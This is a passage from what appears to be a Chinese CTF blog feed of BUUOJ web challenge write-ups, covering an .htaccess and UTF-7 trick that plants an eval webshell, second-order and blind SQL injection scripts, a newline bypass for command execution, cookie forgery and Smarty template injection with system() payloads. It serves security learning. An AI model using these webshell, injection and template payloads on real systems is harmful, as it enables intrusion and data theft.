class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码逻辑：先删除当前目录下除index.php外的所有文件，然后包含fl3g.php，如果存在content和filename，就将content拼接后写入filename</p>
<p>尝试写一个一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_POST[a]);<span class="meta">?&gt;</span>&amp;filename=shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593738690408.png" alt="1593738690408"></p>
<p>可以看到php代码并没有解析，可以通过直接写入<code>.htaccess</code>文件来 get flag。</p>
<blockquote>
<ul>
<li>每次都会<code>unlink</code>删除当前所有除index.php 外的文件</li>
<li>有 on / html / type / flag / upload / file 关键字大小写过滤</li>
<li>文件自动包含<code>fl3g.php</code>，但是文件名有<code>/[^a-z\.]/</code>正则限制</li>
<li>最后还会有<code>\n</code>换行追加数据导致<code>.htaccess</code>解析错误的限制</li>
</ul>
</blockquote>
<p>在<code>.htaccess</code>当中可以使用几种类型格式来更改 php 配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value name value</span><br><span class="line"></span><br><span class="line">php_flag name on|off</span><br><span class="line"></span><br><span class="line">php_admin_value name value</span><br><span class="line"></span><br><span class="line">php_admin_flag name on|off</span><br></pre></td></tr></table></figure>

<p><code>flag</code>被作为关键字过滤了，但是无论是<code>php_flag</code>还是<code>php_amdin_flag</code>只是<code>php_value</code>的简化，能通过<code>php_flag</code>设置的参数我们大部分还是都可以用<code>php_value</code>去设置</p>
<p><strong>error_log</strong></p>
<p><em><code>error_log</code>可以把<code>error_reporting</code>设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件，但是对于一开始就删除当前文件夹下所有文件的操作，即使我们可以写入自定义内容，也会被删除。所以我们可能还需要找另外一条路径使得该文件可以保存下来</em></p>
<p> <strong>include_path</strong></p>
<p> include_path可以指定<code>include</code>等包含函数包含的环境路径，而题目代码使用的是<code>scandir(&#39;./&#39;);</code>作为获取当前文件的操作，只是删除当前文件，而<code>error_log</code>又可以指定路径。所以我们大概可以有这么个思路：</p>
<ul>
<li>使用<code>error_log</code>指定一个非当前文件路径的可写路径，例如<code>/tmp/fl3g.php</code></li>
<li>利用<code>include_path</code>指定包含的环境路径为<code>/tmp</code></li>
<li>这样<code>include</code>包含的时候，就是包含到了<code>/tmp/fl3g.php</code></li>
</ul>
<p>这样就可以绕过删除当前文件夹下所有文件的操作了。</p>
<p>本地试试一下，在当前目录下一个.htaccess文件，内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value include_path /tmp</span><br></pre></td></tr></table></figure>

<p>访问<code>index.php</code>，报错<br><img src="/2020/07/14/buu-web-7/1593741542689.png" alt="1593741542689"></p>
<p>发现报错当中存在我们写入.htaccess文件当中的路径，尝试修改路径为恶意代码达到getshell的目的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value include_path <span class="string">'/tmp&lt;?php phpinfo();?&gt;'</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593741776137.png" alt="1593741776137"></p>
<p>但是尖括号被html编码了，这里可以先用 UTF-7 编码写入，再利用<code>.htaccess</code>解码 UTF-7<br>先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入<code>.htaccess</code>的文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value include_path <span class="string">"D:/phpstudy_pro/wamp64/tmp/xx/+ADw?php phpinfo()+ADs?+AD4-"</span></span><br><span class="line">php_value error_reporting <span class="number">32767</span></span><br><span class="line">php_value error_log D:/phpstudy_pro/wamp64/tmp/fl3g.php</span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>访问index.php报错将日志写入D:/phpstudy_pro/wamp64/tmp/fl3g.php中</p>
<p>之后写入.htaccess新的配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">"UTF-7"</span></span><br><span class="line">php_value include_path <span class="string">"D:/phpstudy_pro/wamp64/tmp/"</span></span><br><span class="line">php_value error_log D:/phpstudy_pro/wamp64/tmp/fl3g.php</span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>访问index.php成功执行恶意代码<br><img src="/2020/07/14/buu-web-7/1593744129319.png" alt="1593744129319"></p>
<p>该题中最后的<code>\nJust one chance</code>影响到了<code>.htaccess</code>文件解析，所以需要利用<code>#</code>注释符将整句话都注视掉，但是又由于有<code>\n</code>换行符的存在，我们不能直接使用<code>#</code>就将其注释掉，需要使用<code>\</code>将其注释掉</p>
<p><strong>解题</strong></p>
<p>通过python进行文件写入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">PAYLOAD1 = <span class="string">"""php_value error_log /tmp/fl3g.php</span></span><br><span class="line"><span class="string">php_value error_reporting 32767</span></span><br><span class="line"><span class="string">php_value include_path "+ADw?php eval($_GET[1]);+ADs?+AD4-"</span></span><br><span class="line"><span class="string"># \\"""</span></span><br><span class="line"></span><br><span class="line">PAYLOAD2 = <span class="string">"""php_value zend.multibyte 1</span></span><br><span class="line"><span class="string">php_value zend.script_encoding "UTF-7"</span></span><br><span class="line"><span class="string">php_value include_path "/tmp/"</span></span><br><span class="line"><span class="string">php_value error_log /tmp/fl3g.php</span></span><br><span class="line"><span class="string"># \\"""</span></span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://e896c0f0-53d0-4352-948f-cf21ad0f1d79.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_content</span><span class="params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"content"</span> : content,</span><br><span class="line">        <span class="string">"filename"</span> : name,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests.get(URL, params=data)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="string">".htaccess"</span>, PAYLOAD1)</span><br><span class="line">print(rep.text)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="string">".htaccess"</span>, PAYLOAD2)</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593746297567.png" alt="1593746297567"></p>
<p>参考文章：<a href="http://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp" target="_blank" rel="noopener">http://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp</a></p>
<h1 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h1><p>题目为一个登陆界面，通过扫描目录发现了register.php，注册后登陆</p>
<p><img src="/2020/07/14/buu-web-7/1593768264872.png" alt="1593768264872"></p>
<p>但是没有一个功能点，所以应该从注册和登陆界面入手，猜测存在二次注入</p>
<p>注入点在注册页面的username处<br>当注册失败的时候返回200，成功则返回302<br>1.出现黑名单字符，返回 nnnnoooo!!!<br>2.语句不正确，返回200<br>3.语句正确，返回302跳转至login.php</p>
<p><img src="/2020/07/14/buu-web-7/1593771663000.png" alt="1593771663000"></p>
<p>fuzz一下过滤的字符</p>
<p><img src="/2020/07/14/buu-web-7/1593771798376.png" alt="1593771798376"></p>
<p>这里需要使用异或注入，构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">email=<span class="number">1111</span>@<span class="number">666.</span>com&amp;username=<span class="number">0</span><span class="string">'%2B(select hex(hex(database())))%2B'</span><span class="number">0</span>&amp;password=<span class="number">1111</span></span><br></pre></td></tr></table></figure>

<p>登陆得到用户名<br><img src="/2020/07/14/buu-web-7/1593772232768.png" alt="1593772232768"></p>
<p>两次hex解码后得到数据库名为web</p>
<blockquote>
<p>至于为什么 <strong>payload</strong> 要进行两次 <strong>hex</strong> 加密，看下面这张图就明白了。</p>
<p><a href="https://mochazz.github.io/img/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA/10.png" target="_blank" rel="noopener"><img src="/2020/07/14/buu-web-7/10.png" alt="10"></a></p>
<p>然后这里还要注意一个问题，就是当数据进过 <strong>两次hex</strong> 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，如下：</p>
<p><a href="https://mochazz.github.io/img/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA/11.png" target="_blank" rel="noopener"><img src="/2020/07/14/buu-web-7/11.png" alt="11"></a></p>
<p>所以这里我们使用 <strong>substr</strong> 每次取10个字符长度与 <strong>‘0’</strong> 相加，这样就不会丢失数据。但是这里使用逗号 <strong>,</strong> 会出错，所以可以使用类似 <strong>substr(‘test’ from 1 for 10)</strong> 这种写法来绕过，具体获取 <strong>flag</strong> 的payload如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>'%<span class="number">2</span><span class="constructor">B(<span class="params">select</span> <span class="params">substr</span>(<span class="params">hex</span>(<span class="params">hex</span>((<span class="params">select</span> <span class="operator">*</span> <span class="params">from</span> <span class="params">flag</span>)</span>)) from <span class="number">1</span> for <span class="number">10</span>))%<span class="number">2</span>B'<span class="number">0</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">URL = <span class="string">'http://89318901-1078-4124-9b4d-7ca578f8039b.node3.buuoj.cn/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"email"</span>: email,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/login.php'</span>, data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1          &lt;/span&gt;'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(u, e)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: u,</span><br><span class="line">        <span class="string">"email"</span>: e,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> login(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(pl)</span>:</span></span><br><span class="line">    email = <span class="string">''</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">'@qq.com'</span></span><br><span class="line">    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLen</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] Starting getLen..."</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</span><br><span class="line">            print(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(sql=<span class="string">"version()"</span>)</span>:</span></span><br><span class="line">    _len = getLen(sql)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _len:</span><br><span class="line">        print(<span class="string">"[-] getLen 'Error'"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    print(<span class="string">"[+] Starting getData..."</span>)</span><br><span class="line">    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, _len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line">            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</span><br><span class="line">                sql, pos, ch)</span><br><span class="line">            <span class="keyword">if</span> b(pl):</span><br><span class="line">                res += ch</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># right(left(x,pos),1)</span></span><br><span class="line"><span class="comment"># mid(x,pos,1)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'</span></span><br><span class="line">    <span class="comment"># pl = "1'and(%s)and'1" % pl</span></span><br><span class="line">    <span class="comment"># print(b(pl))</span></span><br><span class="line">    pl = <span class="string">'version()'</span></span><br><span class="line">    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></span><br><span class="line">    getData(pl)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593775347092.png" alt="1593775347092"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考文章：https:<span class="comment">//mochazz.github.io/2018/08/23/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAWeb%E9%A2%98%E8%A7%A3/#unfinished</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-web六</title>
    <url>/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/</url>
    <content><![CDATA[<p><strong>BUU刷题六</strong></p>
<p><strong>[FBCTF2019]RCEService</strong><br>知识点：命令执行、绕过preg_match</p>
<p><strong>[BSidesCF 2019]Kookie</strong><br>知识点：cookie伪造</p>
<p><strong>[RoarCTF 2019]Online Proxy</strong><br>知识点：X-Forwarded-For处的二次注入</p>
<p><strong>[CISCN2019华东南赛区]Web11</strong><br>知识点：smarty模板注入</p>
<p><strong>[BSidesCF 2020]Had a bad day</strong><br>知识点：php://filter伪协议套一层协议读取flag</p>
<p><strong>[网鼎杯2020朱雀组]phpweb</strong><br>知识点：php反序列化、绕过system</p>
<p><strong>[网鼎杯2020朱雀组]Nmap</strong><br>知识点：escapeshellarg()和escapeshellcmd()漏洞</p>
<p><strong>[CISCN2019-Web5]CyberPunk</strong><br>知识点：文件包含、二次注入</p>
<p><strong>[BJDCTF 2nd]文件探测</strong><br>知识点：SSRF、PHP伪协议包含、逻辑漏洞</p>
<p><strong>[RoarCTF 2019]Simple Upload</strong><br>知识点：Thinkphp文件上传</p>
<p><strong>[RCTF2015]EasySQL</strong><br>知识点：二次注入</p>
<a id="more"></a>

<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>考点：命令执行、绕过preg_match</p>
<p>题目给的表单可以接收<a href="http://d.hatena.ne.jp/keyword/JSON" target="_blank" rel="noopener">JSON</a>格式的命令。先输入{“cmd”:”ls”}<br>返回index.php，但是cat的时候没反应，原因是后端使用preg_match过滤，考虑绕过preg_match的最常用方法之一是使用<strong>多行输入</strong>，因为preg_match仅尝试匹配第一行，即使用%a0换行</p>
<blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;%0a<span class="string">"cmd"</span>:<span class="string">"ls%20-al%20../../../"</span>%0a&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589853355399.png" alt="1589853355399"></p>
<p>在使用cat的时候发现没有cat命令，原因是应用程序的PATH变量更改了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br></pre></td></tr></table></figure>

<p>所以要填写cat的路径：<strong>/bin/cat</strong></p>
<blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;%0a<span class="string">"cmd"</span>:<span class="string">"/bin/cat%20index.php"</span>%0a&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后在/home/rceservice里面发现flag</p>
<blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;%0a<span class="string">"cmd"</span>:<span class="string">"/bin/cat%20/home/rceservice/flag"</span>%0a&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589853605484.png" alt="1589853605484"></p>
<h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><p>打开靶机给出了账户，要求以admin登陆，先使用cookie用户登录，之后修改cookie中的username为admin即可<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589871045369.png" alt="1589871045369"></p>
<h1 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h1><p><strong>考点</strong>：X-Forwarded-For处的二次注入</p>
<p>打开题目感觉有点像ssrf，但是url并没有跳转<br>抓包发现在X-Forwarded-For处写入的会被写进数据库中,存在二次注入</p>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589872846396.png" alt="1589872846396"></p>
<p>攻击流程如下：</p>
<blockquote>
<ul>
<li>第一次执行语句，使payload插入数据库中</li>
<li>第二次执行语句，使payload显示在Lastip的位置</li>
<li>第三次执行语句，使payload生效，显示攻击返回结果</li>
</ul>
</blockquote>
<p>利用此原理，我们可以编写脚本，这里可以使用布尔盲注也可以使用延时注入<br>当执行第三次时返回<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589873865476.png" alt="1589873865476"></p>
<p>构造脚本<br>脚本思路：构造语句，在X-Forwarded-For处发送三次（后两次要不相同），若Last-IP返回值为1则为真</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://node3.buuoj.cn:26716/"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"GET"</span>: <span class="string">"/ HTTP/1.1"</span>,</span><br><span class="line">    <span class="string">"Cookie"</span>: <span class="string">"track_uuid=d98f6951-9f02-4f30-ed6f-bf636aa89edb"</span>,</span><br><span class="line">    <span class="string">"X-Forwarded-For"</span>: <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">def gethtml(url):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        except:</span><br><span class="line">            a = a + <span class="number">1</span></span><br><span class="line">def payload(i, j):</span><br><span class="line">    <span class="comment"># sql = "1' and (ascii(substr((select group_concat(schema_name) from information_schema.schemata,%d,1))&gt;%d) and '1"%(i,j)                                #库名</span></span><br><span class="line">    <span class="comment"># sql = "1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),%d,1))&gt;%d) and '1"%(i,j)          #表名</span></span><br><span class="line">    <span class="comment"># sql = "1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e'),%d,1))&gt;%d) and '1"%(i,j)     #列名</span></span><br><span class="line">    sql = <span class="string">"1' and (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&gt;%d) and '1"</span> % (i, j)</span><br><span class="line">    headers[<span class="string">"X-Forwarded-For"</span>] = sql</span><br><span class="line">    r = gethtml(url)</span><br><span class="line">    headers[<span class="string">"X-Forwarded-For"</span>] = <span class="string">'1'</span></span><br><span class="line">    r = gethtml(url)</span><br><span class="line">    r = gethtml(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Last Ip: 1 -"</span> in r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">def exp():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">print</span>(i, <span class="string">':'</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = (low + high) <span class="comment">// 2</span></span><br><span class="line">            res = payload(i, mid)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = int((low + high + <span class="number">1</span>)) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> (f)</span><br><span class="line">        flag += chr(f)</span><br><span class="line">        <span class="keyword">print</span>(flag)</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'flag='</span>, flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589883351760.png" alt="1589883351760"></p>
<p>这里需要跨库查询<br>自己写了半天，一直报错，最后还是照搬吧。。。<br>参考文章：<a href="http://www.cl4y.top/buuctf_wp/#toc-head-33" target="_blank" rel="noopener">http://www.cl4y.top/buuctf_wp/#toc-head-33</a></p>
<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p><strong>考点：smarty模板注入</strong></p>
<h2 id="Smarty-SSTI-："><a href="#Smarty-SSTI-：" class="headerlink" title="*Smarty  SSTI ： *"></a>*<em>Smarty  SSTI ： *</em></h2><p><strong>Smarty简介</strong><br><a href="https://www.smarty.net/docs/zh_CN/" target="_blank" rel="noopener">smarty手册</a></p>
<p>Smarty是一个PHP的模板引擎，它提供了一种易于管理和使用的办法，用来将原本与HTML代码混杂在一起的PHP代码逻辑分离</p>
<p><strong>漏洞确认</strong></p>
<p>在可能出现模板注入的输入点，输入以下POC进行判断：</p>
<p>查看Smarty版本：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.<span class="keyword">version</span>&#125;</span><br></pre></td></tr></table></figure>

<p>注释：</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">&#123;#xxx#&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用</strong></p>
<p>不同版本可以利用的方式不同，常用的有以下三种方法：</p>
<p>1.旧版Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令。</p>
<p>Smarty3的官方手册描述：</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">Smarty已经废弃</span><span class="template-variable">&#123;php&#125;</span><span class="xml">标签，强烈建议不要使用。在Smarty 3.1，</span><span class="template-variable">&#123;php&#125;</span><span class="xml">仅在SmartyBC中可用</span></span><br></pre></td></tr></table></figure>

<p>2.旧版Smarty可以通过self获取Smarty类再调用其静态方法实现文件读写</p>
<p>3.PHP函数都可以在模板中使用，因此注入时，可以直接使用：</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;system(<span class="name">'ls'</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>便可随意执行命令；执行多条语句的话可以使用下面的形式：</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;system(<span class="name">'ls'</span>)&#125;&#123;system(<span class="name">'cat</span> index.php')&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><ol>
<li>在网页底部提醒<code>Build With Smarty</code>，猜测应该是<code>smarty ssti</code>，右上角显示了<code>IP</code>，猜测注入点应该再<code>X-Forwarded-For</code></li>
<li>设置<code>X-Forwarded-For</code>为<code>{7*7}</code>，在<code>current ip</code> 处回显<code>49</code>，存在<code>ssti</code><br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589979453978.png" alt="1589979453978"></li>
</ol>
<blockquote>
<p>在<a href="https://www.smarty.net/docs/zh_CN/" target="_blank" rel="noopener">smarty手册</a>中，{$smarty.version}，返回版本信息3.1.30，这里smarty的版本是,${smarty.template}返回当前模板的文件名4ed582e9244071180a8f7bf5488bbe35a977987e</p>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589979596132.png" alt="1589979596132"></p>
